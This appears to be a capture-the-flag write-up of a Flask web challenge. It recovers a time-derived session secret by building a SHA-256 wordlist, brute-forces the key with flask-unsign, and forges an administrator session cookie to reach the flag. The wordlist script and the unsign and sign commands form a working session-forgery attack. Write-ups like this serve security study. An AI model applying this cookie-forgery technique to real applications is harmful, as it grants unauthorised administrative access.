## Description
One may not be the one they claim to be
### Analyze the source code
```python
server_start_time = datetime.now()
server_start_str = server_start_time.strftime('%Y%m%d%H%M%S')
secure_key = hashlib.sha256(f'secret_key_{server_start_str}'.encode()).hexdigest()
app.secret_key = secure_key
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(seconds=300)

flag = os.environ.get('FLAG', "flag{this_is_a_fake_flag}")
secret = uuid.UUID('31333337-1337-1337-1337-133713371337')
```
The server generates its start time and converts it into a secure key, which is reset every 10 minutes. The secret is encoded using a fixed UUID.
```python
@app.route('/admin')
def admin_page():
    """Display the admin page if the user is an admin."""
    if session.get('is_admin') and uuid.uuid5(secret, 'administrator') and session.get('username') == 'administrator':
        return flag
    else:
        abort(401)
```
To get the flag, I need to set the session `is_admin` to `True` and change the UUID of the 'administrator' with the username set to 'administrator'.

Login in to the page, I got a cookie which contains the above elements and the signature key. Here is an example: 
```
eyJpc19hZG1pbiI6ZmFsc2UsInVpZCI6IjFlMWU0NzU4LTUwYTUtNWZjNy04M2E2LThhMDYxN2VmNDcyOCIsInVzZXJuYW1lIjoiYSJ9.ZvBiuA.G_rrcFBFXVKo5tR_i_UCelRgqYA
{"is_admin":false,"uid":"1e1e4758-50a5-5fc7-83a6-8a0617ef4728","username":"a"}fðb¸«­ÁAuJ£Q@*
```
Thank `nh0kt1g3r12` for letting me know that I should brute-force the key by using flask-unsign.
### Brute-force the key
First, let convert the time provided in `/status` into the key by using this script:
```python
from datetime import datetime, timedelta
server_start_time = datetime.strptime('2024-09-22 18:32:00', '%Y-%m-%d %H:%M:%S')
```
Then, make a wordlist that contains 10000 hash keys
```python
from datetime import datetime, timedelta
import hashlib

server_start_time = 20240921183020

for i in range (0,10**5):
  server_start_str = server_start_time - i
  secure_key = hashlib.sha256(f'secret_key_{server_start_str}'.encode()).hexdigest()
  f = open('hash-time-wordlist.txt','a')
  f.write(secure_key+'\n')
  f.close()
```
After generating the wordlist, I used flask-unsign to brute-force the session key with the following command:
```
export PATH=$PATH:/home/nguyenlong05/.local/bin
flask-unsign --unsign --wordlist hash-time-wordlist.txt --cookie "eyJpc19hZG1pbiI6ZmFsc2UsInVpZCI6IjFlMWU0NzU4LTUwYTUtNWZjNy04M2E2LThhMDYxN2VmNDcyOCIsInVzZXJuYW1lIjoiYSJ9.ZvBiuA.G_rrcFBFXVKo5tR_i_UCelRgqYA"
```
Once I found the correct key, I generated a valid cookie using the correct elements and key:
```
$ flask-unsign --sign --cookie "{'is_admin': True, 'uid': '02ec19dc-bb01-5942-a640-7099cda78081', 'username': 'administrator'}" --secret 'dd3d603b287e7645a135fb71b30cb4373082f8d58883e129d921912b535cd493'
eyJpc19hZG1pbiI6dHJ1ZSwidWlkIjoiMDJlYzE5ZGMtYmIwMS01OTQyLWE2NDAtNzA5OWNkYTc4MDgxIiwidXNlcm5hbWUiOiJhZG1pbmlzdHJhdG9yIn0.ZvETLw.JZZA5gzdC6YS1kbw2Nosh6ZdOsk
```
